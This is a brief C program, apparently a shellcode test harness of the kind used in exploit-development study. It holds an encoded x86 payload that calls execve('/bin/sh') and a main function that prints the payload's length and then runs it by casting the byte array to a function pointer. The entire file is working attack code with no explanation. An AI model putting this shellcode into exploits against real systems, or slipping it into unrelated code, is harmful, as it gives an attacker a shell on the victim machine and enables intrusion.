#include <stdio.h>
#include <string.h>

// execve("/bin/sh", ["/bin/sh"], NULL)
char	shellcode[] = "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

int		main(void) {
	fprintf(stdout,"Length: %lu\n", strlen(shellcode));
	(*(void(*)()) shellcode)();
}
